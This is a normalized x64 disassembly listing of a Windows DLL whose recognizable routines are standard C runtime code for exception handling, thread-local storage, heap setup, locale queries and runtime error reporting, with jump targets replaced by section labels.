mov [ rbp + 0x47 ] r14b
call sub_180025a78
lea r9 [ rbp - 0x21 ]
mov r8 rbx
mov rdx r15
mov rcx r13
mov esi eax
call sub_18002098c
mov r8 rbx
mov rdx r15
mov rcx r13
call sub_180025af0
mov r8 rbx
mov rdx r15
cmp esi eax
jle r-xdata
mov rcx r13
call sub_180025af0
mov esi eax
lea rcx [ rbp - 0x21 ]
mov r9d esi
call sub_180025aa8
mov r9d esi
mov r8 rbx
mov rdx r15
mov rcx r13
call sub_180025ab4
jmp r-xdata
call sub_1800260d0
cmp esi [ rbx + 0x4 ]
jl r-xdata
cmp esi 0xffffffff
jl r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
cmp [ rbx + 0xc ] 0x0
jbe r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
call sub_180025c90
cmp [ rax + 0x108 ] 0x0
je r-xdata
cmp [ rbp + 0x6f ] 0x0
jne r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
mov rbx [ rsp + 0xe8 ]
add rsp 0x90
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
call sub_1800260d0
call sub_1800260ac
mov rax [ rbp + 0x7f ]
mov r9 r15
mov r8 r12
mov [ rsp + 0x38 ] rax
mov eax [ rbp + 0x77 ]
mov rdx r13
mov [ rsp + 0x30 ] eax
mov rcx rdi
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] rbx
call sub_180024858
jmp r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
cmp [ rdi + 0x30 ] 0x0
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
call sub_180025c90
cmp [ rax + 0xf0 ] 0x0
je r-xdata
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
cmp [ rbx + 0xc ] 0x0
jbe r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
call sub_180025c90
mov rdi [ rax + 0xf0 ]
call sub_180025c90
mov rcx [ rdi + 0x38 ]
mov r12 [ rax + 0xf8 ]
mov [ rbp + 0x57 ] r12
call sub_180020ac4
mov edx 0x1
mov rcx rdi
call sub_18002dd68
test eax eax
jne r-xdata
mov eax [ rbx ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
mov r8d [ rbp + 0x77 ]
lea rax [ rbp - 0x31 ]
mov [ rsp + 0x30 ] r15
mov [ rsp + 0x28 ] rax
lea rax [ rbp - 0x39 ]
mov r9d esi
mov rdx rbx
mov rcx r13
mov [ rsp + 0x20 ] rax
call sub_180020d0c
mov ecx [ rbp - 0x39 ]
mov edx [ rbp - 0x31 ]
cmp ecx edx
jae r-xdata
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
call sub_1800260d0
mov esi [ rbx + 0x20 ]
test esi esi
je r-xdata
lea r12 [ rax + 0x10 ]
call sub_180025c90
cmp [ rax + 0x108 ] 0x0
je r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
xor eax eax
movsxd rsi esi
call sub_180020a78
add rax rsi
jmp r-xdata
inc ecx
add r12 0x14
mov [ rbp - 0x39 ] ecx
cmp ecx edx
jb r-xdata
cmp esi [ r12 - 0xc ]
jg r-xdata
call sub_180025c90
mov r12 [ rax + 0x108 ]
call sub_180025c90
mov rdx r12
and [ rax + 0x108 ] 0x0
mov rcx rdi
call sub_1800241f8
test al al
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
test esi esi
je r-xdata
test rax rax
je r-xdata
cmp [ r12 - 0x10 ] esi
jg r-xdata
test r14b r14b
jne r-xdata
call sub_180020a78
movsxd r13 [ r12 ]
mov r14d [ r12 - 0x4 ]
add r13 rax
mov r12 [ rbp + 0x57 ]
xor r13d r13d
cmp [ r12 ] r13d
jle r-xdata
cmp [ rdi + 0x30 ] 0x0
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
xor edx edx
call sub_180020a78
mov rdx rax
movsxd rax [ rbx + 0x20 ]
add rdx rax
jmp r-xdata
mov r14b [ rbp + 0x47 ]
mov r13 [ rbp + 0x4f ]
call sub_180020a90
mov rcx [ rdi + 0x30 ]
movsxd rdx [ rcx + 0xc ]
lea rax [ rax + rdx + 0x4 ]
mov [ rbp - 0x29 ] rax
call sub_180020a90
mov rcx [ rdi + 0x30 ]
movsxd rdx [ rcx + 0xc ]
mov ecx [ rax + rdx ]
mov [ rbp - 0x35 ] ecx
test ecx ecx
jle r-xdata
call sub_1800260ac
xor esi esi
call sub_1800260d0
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
lea r9 [ rbp + 0x47 ]
mov r8 rbx
mov rdx r15
mov rcx r13
call sub_18002098c
mov cl [ rbp + 0x6f ]
mov r8 [ rbp + 0x57 ]
mov [ rsp + 0x40 ] cl
mov [ rsp + 0x38 ] r15
mov [ rsp + 0x30 ] rbx
or [ rsp + 0x28 ] 0xffffffff
and [ rsp + 0x20 ] 0x0
mov r9 rax
mov rdx rdi
mov rcx r13
call sub_180020f10
mov rcx rdi
call sub_1800241f8
test al al
jne r-xdata
dec r14d
add r13 0x14
jmp r-xdata
call sub_180020a90
mov rcx [ rbp - 0x29 ]
mov r8 [ rdi + 0x30 ]
movsxd rcx [ rcx ]
add rax rcx
mov rcx r13
mov rdx rax
mov [ rbp - 0x19 ] rax
call sub_180023e70
test eax eax
jne r-xdata
xor eax eax
call sub_180020a78
movsxd rcx [ r12 + 0x4 ]
add rax rsi
movsxd rbx [ rcx + rax + 0x4 ]
call sub_180020a78
add rax rbx
jmp r-xdata
test r14d r14d
jle r-xdata
mov al [ rbp + 0x6f ]
mov r8 [ rbp + 0x57 ]
mov r14b 0x1
mov [ rsp + 0x40 ] al
lea rax [ r12 - 0x10 ]
mov r9 r15
mov [ rsp + 0x38 ] rax
mov rax [ rbp - 0x19 ]
mov rcx rdi
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] r13
mov r13 [ rbp + 0x4f ]
mov rdx r13
mov [ rbp + 0x47 ] r14b
mov [ rsp + 0x20 ] rbx
call sub_180024794
jmp r-xdata
mov eax [ rbp - 0x35 ]
add [ rbp - 0x29 ] 0x4
dec eax
mov [ rbp - 0x35 ] eax
test eax eax
jg r-xdata
mov dl 0x1
mov rcx rdi
call sub_180024174
lea r11 [ r--data ]
lea rdx [ rbp + 0x47 ]
lea rcx [ rbp - 0x11 ]
mov [ rbp + 0x47 ] r11
call sub_180020424
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x11 ]
mov [ rbp - 0x11 ] r11
call sub_1800210a4
int3
inc r13d
add rsi 0x14
cmp r13d [ r12 ]
jl r-xdata
lea rdx [ rw-data ]
mov rcx rax
call sub_18002059c
test al al
jne r-xdata
mov edx [ rbp - 0x31 ]
mov ecx [ rbp - 0x39 ]
call sub_180020a78
movsxd rcx [ r12 + 0x4 ]
add rax rsi
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
sub_180024f84
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r14
sub rsp 0x40
mov rbp r9
mov r12 r8
mov rsi rdx
mov rbx rcx
call sub_180025c90
mov rdi [ rsp + 0x80 ]
cmp [ rax + 0x2c0 ] 0x0
mov edx 0x1fffffff
mov r8d 0x80000029
mov r9d 0x80000026
mov r14d 0x1
jne r-xdata
mov eax [ rbx + 0x4 ]
test al 0x66
je r-xdata
cmp [ rbx ] 0xe06d7363
je r-xdata
cmp [ rdi + 0xc ] 0x0
jne r-xdata
cmp [ rdi + 0x4 ] 0x0
je r-xdata
cmp [ rbx ] r8d
jne r-xdata
cmp [ rbx ] 0xe06d7363
jne r-xdata
mov eax [ rdi ]
and eax edx
cmp eax 0x19930521
jb r-xdata
mov eax r14d
cmp [ rsp + 0x88 ] 0x0
jne r-xdata
cmp [ rbx ] r9d
je r-xdata
cmp [ rbx + 0x18 ] 0xf
jne r-xdata
mov rax [ rsp + 0x90 ]
mov r9 rbp
mov r8 r12
mov [ rsp + 0x38 ] rax
mov eax [ rsp + 0x88 ]
mov rdx rsi
mov [ rsp + 0x30 ] eax
mov al [ rsp + 0x98 ]
mov rcx rbx
mov [ rsp + 0x28 ] al
mov [ rsp + 0x20 ] rdi
call sub_180024a90
cmp [ rbx + 0x18 ] 0x3
jb r-xdata
cmp [ rdi + 0x20 ] 0x0
je r-xdata
and eax 0x20
je r-xdata
mov ecx [ rdi ]
and ecx edx
cmp ecx 0x19930522
jb r-xdata
cmp [ rbx + 0x60 ] 0x19930520
je r-xdata
cmp [ rbx + 0x20 ] 0x19930522
jbe r-xdata
xor eax eax
call sub_180020a78
movsxd rcx [ rdi + 0x20 ]
add rax rcx
jmp r-xdata
test eax eax
je r-xdata
cmp [ rbx ] r9d
jne r-xdata
test [ rdi + 0x24 ] r14b
jne r-xdata
mov rax [ rbx + 0x30 ]
cmp [ rax + 0x8 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov r8 rdi
mov rdx rbp
mov rcx rsi
call sub_180020ae0
jmp r-xdata
cmp [ rbx ] r8d
jne r-xdata
mov r8 [ r12 + 0xf8 ]
mov rdx rbp
mov rcx rdi
call sub_1800259ec
mov ebx eax
cmp eax 0xffffffff
jl r-xdata
xor r11d r11d
call sub_180020a90
mov rcx [ rbx + 0x30 ]
movsxd r11 [ rcx + 0x8 ]
add r11 rax
jmp r-xdata
mov esi [ rbx + 0x38 ]
cmp esi 0xffffffff
jl r-xdata
call sub_1800260d0
cmp eax [ rdi + 0x4 ]
jl r-xdata
movzx eax [ rsp + 0x98 ]
mov r9 rbp
mov r8 r12
mov [ rsp + 0x38 ] eax
mov rax [ rsp + 0x90 ]
mov rdx rsi
mov [ rsp + 0x30 ] rax
mov eax [ rsp + 0x88 ]
mov rcx rbx
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] rdi
call r11
jmp r-xdata
test r11 r11
je r-xdata
call sub_1800260d0
cmp esi [ rdi + 0x4 ]
jl r-xdata
mov r9d ebx
mov rcx rsi
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x40
pop r14
pop r12
pop rdi
retn
mov rcx [ rbx + 0x28 ]
mov r9d esi
jmp r-xdata
mov rdx rbp
mov r8 rdi
call sub_180023fe8
jmp r-xdata
sub_1800251ac
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov esi r9d
mov r11 r8
mov r10 rdx
mov edi ecx
test rdx rdx
jne r-xdata
test r8 r8
je r-xdata
call sub_180022de4
mov ebx 0x16
mov [ rdx ] 0x0
mov edx [ rsp + 0x50 ]
mov eax edx
neg eax
sbb rcx rcx
neg rcx
inc rcx
cmp r8 rcx
ja r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea eax [ r9 - 0x2 ]
mov ebx 0x22
cmp eax ebx
ja r-xdata
call sub_180022de4
mov ebx 0x22
jmp r-xdata
xor ecx ecx
mov r8 r10
test edx edx
je r-xdata
mov [ rax ] ebx
call sub_180026534
mov eax ebx
jmp r-xdata
mov r9 r8
mov [ r10 ] 0x2d
lea r8 [ r10 + 0x1 ]
lea ecx [ rbx - 0x21 ]
neg edi
add dl 0x30
add dl 0x57
jmp r-xdata
cmp rcx r11
jb r-xdata
cmp rcx r11
jb r-xdata
mov [ r8 ] dl
inc rcx
inc r8
test eax eax
je r-xdata
mov [ r8 ] 0x0
dec r8
mov [ r10 ] 0x0
call sub_180022de4
jmp r-xdata
xor edx edx
mov eax edi
div esi
mov edi eax
cmp edx 0x9
jbe r-xdata
mov al [ r9 ]
mov cl [ r8 ]
mov [ r8 ] al
mov [ r9 ] cl
inc r9
dec r8
cmp r9 r8
jb r-xdata
xor eax eax
sub_1800252c8
sub rsp 0x28
call sub_18002de14
test rax rax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
mov ecx 0x16
call sub_18002de24
mov ecx 0x3
call sub_1800268b4
int3
mov r8d 0x1
mov edx 0x40000015
lea ecx [ r8 + 0x2 ]
call sub_180026344
sub_180025324
push rbx
sub rsp 0x20
test rcx rcx
je r-xdata
call sub_180022de4
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
mov r9 rcx
sub r9 r8
mov [ rcx ] r8b
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rcx ] dl
call sub_180022de4
mov ebx 0x22
jmp r-xdata
mov al [ r8 ]
mov [ r9 + r8 ] al
inc r8
test al al
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_180026534
mov eax ebx
sub_180025388
push rbx
sub rsp 0x30
mov rbx rcx
mov ecx 0xe
call sub_18002d0a8
nop
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
mov ecx 0xe
call sub_18002cfa8
add rsp 0x30
pop rbx
retn
mov rcx [ rw-data ]
lea rdx [ rw-data ]
mov rcx [ rbx + 0x8 ]
call sub_18002094c
and [ rbx + 0x8 ] 0x0
cmp [ rcx ] rax
jne r-xdata
mov rdx rcx
jmp r-xdata
mov rax [ rcx + 0x8 ]
mov [ rdx + 0x8 ] rax
call sub_18002094c
jmp r-xdata
mov [ rsp + 0x20 ] rcx
test rcx rcx
je r-xdata
sub_180025410
sub rdx rcx
mov r9 rdx
test cl 0x7
je r-xdata
mov r11 0x8101010101010100
mov al [ rcx ]
mov dl [ rcx + r9 ]
cmp al dl
jne r-xdata
mov rax [ rcx ]
mov rdx [ rcx + r9 ]
cmp rax rdx
jne r-xdata
sbb rax rax
sbb rax 0xffffffffffffffff
retn
inc rcx
test al al
je r-xdata
mov r10 0x7efefefefefefeff
add r10 rdx
xor rax 0xffffffffffffffff
add rcx 0x8
xor rax r10
test r11 rax
je r-xdata
xor eax eax
retn
test rcx 0x7
jne r-xdata
lea rdx [ rcx + r9 ]
and dx 0xfff
cmp dx 0xff8
ja r-xdata
jmp r-xdata
nop
test dl dl
je r-xdata
xor eax eax
retn
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr edx 0x10
test dl dl
je r-xdata
test dh dh
jne r-xdata
sub_1800254c0
lea r8 [ r--data ]
xor eax eax
mov rdx r8
cdqe
add rax rax
mov rax [ r8 + rax * 8 + 0x8 ]
retn
inc eax
add rdx 0x10
cmp eax 0x16
jb r-xdata
cmp ecx [ rdx ]
je r-xdata
xor eax eax
retn
sub_1800254ec
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x250
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x240 ] rax
mov edi ecx
call sub_1800254c0
xor esi esi
mov rbx rax
test rax rax
je r-xdata
mov rcx [ rsp + 0x240 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0x250 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x30 ]
mov rsi [ r11 + 0x38 ]
mov rsp r11
pop r13
pop r12
pop rdi
retn
lea ecx [ rsi + 0x3 ]
call sub_18002e34c
cmp eax 0x1
je r-xdata
mov ecx 0xfffffff4
call [ GetStdHandle@IAT ]
mov rdi rax
test rax rax
je r-xdata
lea ecx [ rsi + 0x3 ]
call sub_18002e34c
test eax eax
jne r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
cmp edi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
mov edx esi
lea r8 [ rsp + 0x40 ]
lea rbp [ rw-data ]
mov r12d 0x314
lea r8 [ r--data ]
mov rcx rbp
mov edx r12d
call sub_180021ea0
xor ecx ecx
test eax eax
jne r-xdata
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x233 ] sil
call sub_180023ce0
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x40 ]
mov rcx rdi
mov r8 rax
mov [ rsp + 0x20 ] rsi
call [ WriteFile@IAT ]
inc edx
inc r8
add rbx 0x2
cmp edx 0x1f4
jb r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
mov [ rsp + 0x20 ] rsi
call sub_180026490
int3
lea r13 [ rw-data ]
mov r8d 0x104
mov [ rw-data ] si
mov rdx r13
call [ GetModuleFileNameW@IAT ]
lea edi [ r12 - 0x19 ]
test eax eax
jne r-xdata
mov cl [ rbx ]
mov [ r8 ] cl
cmp [ rbx ] si
je r-xdata
mov rcx r13
call sub_18002e330
inc rax
cmp rax 0x3c
jbe r-xdata
lea r8 [ r--data ]
mov edx edi
mov rcx r13
call sub_180021ea0
test eax eax
je r-xdata
lea r8 [ r--data ]
mov rdx r12
mov rcx rbp
call sub_180021e18
test eax eax
jne r-xdata
mov rcx r13
call sub_18002e330
lea r8 [ r--data ]
mov r9d 0x3
lea rcx [ rbp + rax * 2 - 0x44 ]
mov rax rcx
sub rax r13
sar rax 0x1
sub rdi rax
mov rdx rdi
call sub_18002e260
test eax eax
je r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_180026490
int3
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_180026490
int3
mov r8 rbx
mov rdx r12
mov rcx rbp
call sub_180021e18
test eax eax
jne r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_180026490
int3
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
call sub_180026490
int3
lea rdx [ r--data ]
mov r8d 0x12010
mov rcx rbp
call sub_18002e058
jmp r-xdata
sub_18002574c
sub rsp 0x28
mov ecx 0x3
call sub_18002e34c
cmp eax 0x1
je r-xdata
mov ecx 0xfc
call sub_1800254ec
mov ecx 0xff
call sub_1800254ec
mov ecx 0x3
call sub_18002e34c
test eax eax
jne r-xdata
add rsp 0x28
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_180025790
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0xd0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xc0 ] rax
mov rbx [ rsp + 0x130 ]
mov esi r9d
mov r12d r8d
mov r14 rcx
cmp edx 0x1
jne r-xdata
mov ebp 0x2
cmp edx ebp
jne r-xdata
lea r9 [ rsp + 0x40 ]
mov r8d esi
mov edx r12d
lea rdi [ rsp + 0x40 ]
xor ebp ebp
mov [ rsp + 0x20 ] 0x80
call sub_18002e4e4
mov r13d eax
test eax eax
jne r-xdata
test edx edx
jne r-xdata
and [ rbx ] 0x0
xor r9d r9d
xor r8d r8d
mov edx esi
mov ecx r12d
call [ GetLocaleInfoW@IAT ]
movsxd rdi eax
test eax eax
je r-xdata
movsxd rsi r13d
mov edx 0x1
mov rcx rsi
call sub_180022c90
mov rcx rax
mov [ rbx ] rax
test rax rax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
or eax 0xffffffff
and [ rsp + 0x30 ] edx
bts esi 0x1d
lea r8 [ rsp + 0x30 ]
mov edx esi
mov r9d ebp
mov ecx r12d
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
mov rcx [ rbx ]
call sub_18002094c
and [ rbx ] 0x0
jmp r-xdata
mov rcx rdi
mov edx ebp
call sub_180022c90
mov [ rbx ] rax
test rax rax
je r-xdata
lea eax [ r13 - 0x1 ]
mov r8 rdi
mov rdx rsi
movsxd r9 eax
call sub_18002d168
test eax eax
jne r-xdata
test ebp ebp
je r-xdata
and [ rsp + 0x20 ] ebp
xor r9d r9d
mov r8d esi
mov edx r12d
mov rcx r14
call sub_18002e4e4
movsxd r13 eax
test eax eax
je r-xdata
mov al [ rsp + 0x30 ]
mov [ rbx ] al
jmp r-xdata
mov r9d edi
mov r8 rax
mov edx esi
mov ecx r12d
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180026490
int3
test ebp ebp
je r-xdata
mov rcx rdi
call sub_18002094c
lea edx [ rbp + 0x1 ]
mov rcx r13
call sub_180022c90
mov rdi rax
test rax rax
je r-xdata
xor eax eax
jmp r-xdata
mov rcx rdi
call sub_18002094c
mov r9 rax
mov r8d esi
mov edx r12d
mov rcx r14
mov ebp 0x1
mov [ rsp + 0x20 ] r13d
call sub_18002e4e4
mov r13d eax
test eax eax
je r-xdata
mov rcx [ rsp + 0xc0 ]
xor rcx rsp
call sub_1800212e0
add rsp 0xd0
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_180025974
sub rsp 0x28
xor r8d r8d
mov edx 0x1000
xor ecx ecx
mov [ rsp + 0x30 ] 0x2
call [ HeapCreate@IAT ]
mov [ rw-data ] rax
test rax rax
je r-xdata
add rsp 0x28
retn
call [ GetVersion@IAT ]
cmp al 0x6
jae r-xdata
mov eax 0x1
mov rcx [ rw-data ]
lea r8 [ rsp + 0x30 ]
mov r9d 0x4
xor edx edx
call [ HeapSetInformation@IAT ]
sub_1800259ec
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbp r8
mov rsi rdx
mov rbx rcx
test rcx rcx
jne r-xdata
movsxd rax [ rbx + 0x18 ]
mov edi [ rbx + 0x14 ]
add rax [ rsi + 0x8 ]
jne r-xdata
call sub_1800260d0
xor ecx ecx
test edi edi
je r-xdata
call sub_1800260d0
or eax 0xffffffff
mov r9 [ rsi + 0x8 ]
movsxd r8 [ rbx + 0x18 ]
lea rdx [ r9 + r8 ]
test ecx ecx
je r-xdata
inc ecx
add rdx 0x8
cmp ecx edi
jb r-xdata
lea eax [ rcx - 0x1 ]
lea rdx [ r8 + rax * 8 ]
mov eax [ rdx + r9 + 0x4 ]
jmp r-xdata
movsxd rax [ rdx ]
add rax r9
cmp rbp rax
jl r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_180025ab4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov edi r9d
lea r9 [ rsp + 0x40 ]
mov rbx r8
call sub_18002098c
mov rcx [ rax ]
movsxd rax [ rbx + 0x1c ]
mov [ rsp + 0x40 ] rcx
cmp edi [ rax + rcx + 0x4 ]
jle r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rax + rcx + 0x4 ] edi
sub_180025b54
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx + 0xa0 ] rax
and [ rcx + 0x10 ] 0x0
mov [ rcx + 0x1c ] 0x1
mov [ rcx + 0xc8 ] 0x1
mov [ rcx + 0x174 ] 0x43
mov [ rcx + 0x1f7 ] 0x43
lea rax [ rw-data ]
mov [ rcx + 0xb8 ] rax
mov ecx 0xd
call sub_18002d0a8
nop
mov rax [ rbx + 0xb8 ]
[ rax ]
mov ecx 0xd
call sub_18002cfa8
mov ecx 0xc
call sub_18002d0a8
nop
mov [ rbx + 0xc0 ] rdi
test rdi rdi
jne r-xdata
mov rcx [ rbx + 0xc0 ]
call sub_1800268f8
nop
mov ecx 0xc
call sub_18002cfa8
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rw-data ]
mov [ rbx + 0xc0 ] rax
sub_180025c0c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
mov edi eax
call [ FlsGetValue@IAT ]
mov rbx rax
test rax rax
jne r-xdata
mov ecx edi
call [ SetLastError@IAT ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rax + 0x1 ]
mov edx 0x2c8
call sub_180022c90
mov rbx rax
test rax rax
je r-xdata
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
mov rcx rbx
test eax eax
je r-xdata
call sub_18002094c
xor ebx ebx
xor edx edx
call sub_180025b54
call [ GetCurrentThreadId@IAT ]
or [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
jmp r-xdata
sub_180025cb4
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x38 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x48 ]
test rcx rcx
je r-xdata
call sub_18002094c
mov rcx [ rbx + 0x58 ]
test rcx rcx
je r-xdata
call sub_18002094c
mov rcx [ rbx + 0x68 ]
test rcx rcx
je r-xdata
call sub_18002094c
mov rcx [ rbx + 0x70 ]
test rcx rcx
je r-xdata
call sub_18002094c
mov rcx [ rbx + 0x78 ]
test rcx rcx
je r-xdata
call sub_18002094c
mov rcx [ rbx + 0x80 ]
test rcx rcx
je r-xdata
call sub_18002094c
mov rcx [ rbx + 0xa0 ]
lea rax [ r--data ]
cmp rcx rax
je r-xdata
call sub_18002094c
mov edi 0xd
mov ecx edi
call sub_18002d0a8
nop
mov rcx [ rbx + 0xb8 ]
mov [ rsp + 0x30 ] rcx
test rcx rcx
je r-xdata
call sub_18002094c
mov ecx edi
call sub_18002cfa8
mov ecx 0xc
call sub_18002d0a8
nop
mov rdi [ rbx + 0xc0 ]
test rdi rdi
je r-xdata
[ rcx ]
jne r-xdata
mov ecx 0xc
call sub_18002cfa8
mov rcx rbx
call sub_18002094c
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
mov rcx rdi
call sub_180026984
cmp rdi [ rw-data ]
je r-xdata
lea rax [ rw-data ]
mov rcx [ rsp + 0x30 ]
cmp rcx rax
je r-xdata
lea rax [ rw-data ]
cmp rdi rax
je r-xdata
call sub_18002094c
nop
cmp [ rdi ] 0x0
jne r-xdata
mov rcx rdi
call sub_180026a28
nop
sub_180025de8
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
add rsp 0x20
pop rbx
retn
test rbx rbx
jne r-xdata
xor edx edx
call [ FlsSetValue@IAT ]
mov rcx rbx
call sub_180025cb4
call [ FlsGetValue@IAT ]
mov ecx [ rw-data ]
mov rbx rax
sub_180025e28
push rbx
sub rsp 0x20
call sub_1800265c0
call sub_18002ce9c
test eax eax
je r-xdata
call sub_180025b2c
xor eax eax
lea rcx [ sub_180025cb4 ]
call [ FlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
mov edx 0x2c8
mov ecx 0x1
call sub_180022c90
mov rbx rax
test rax rax
je r-xdata
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
test eax eax
je r-xdata
xor edx edx
mov rcx rbx
call sub_180025b54
call [ GetCurrentThreadId@IAT ]
or [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
mov eax 0x1
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_180025eac
mov r11 rsp
mov [ r11 + 0x8 ] rbx
mov [ r11 + 0x18 ] rbp
mov [ r11 + 0x20 ] rsi
mov [ r11 + 0x10 ] rdx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov r15 [ r9 + 0x8 ]
mov r14 [ r9 ]
mov eax [ rcx + 0x4 ]
mov rdi [ r9 + 0x38 ]
sub r14 r15
mov r12 r9
mov r13 rdx
mov rbp rcx
test al 0x66
jne r-xdata
mov r8 [ r9 + 0x20 ]
xor ebp ebp
xor r13d r13d
sub r8 r15
test al 0x20
je r-xdata
movsxd rsi [ r9 + 0x48 ]
mov [ r11 - 0x38 ] rcx
mov [ r11 - 0x30 ] r8
mov rax rsi
cmp esi [ rdi ]
jae r-xdata
movsxd rsi [ r9 + 0x48 ]
mov rbx rsi
cmp esi [ rdi ]
jae r-xdata
xor edx edx
cmp [ rdi ] edx
jbe r-xdata
mov eax 0x1
add rax rax
lea rbx [ rdi + rax * 8 + 0xc ]
inc rbx
shl rbx 0x4
add rbx rdi
lea rcx [ rdi + 0x8 ]
inc esi
add rbx 0x10
cmp esi [ rdi ]
jae r-xdata
mov eax [ rbx - 0x4 ]
cmp r14 rax
jae r-xdata
inc esi
add rbx 0x10
cmp esi [ rdi ]
jb r-xdata
mov eax [ rbx - 0x8 ]
cmp r14 rax
jae r-xdata
inc edx
add rcx 0x10
cmp edx [ rdi ]
jae r-xdata
mov eax [ rcx ]
cmp r8 rax
jbe r-xdata
jmp r-xdata
cmp [ rbx + 0x4 ] 0x0
je r-xdata
mov eax [ rbx - 0xc ]
cmp r14 rax
jb r-xdata
test r13d r13d
je r-xdata
jmp r-xdata
mov eax edx
add rax rax
mov ecx [ rdi + rax * 8 + 0x10 ]
test ecx ecx
jne r-xdata
mov eax [ rbx - 0x8 ]
cmp r14 rax
jb r-xdata
cmp [ rbx ] 0x1
je r-xdata
test ebp ebp
je r-xdata
cmp r13d [ rbx ]
je r-xdata
mov eax [ rcx - 0x4 ]
cmp r8 rax
jb r-xdata
mov r13d ecx
mov ebp [ rdi + rax * 8 + 0xc ]
jmp r-xdata
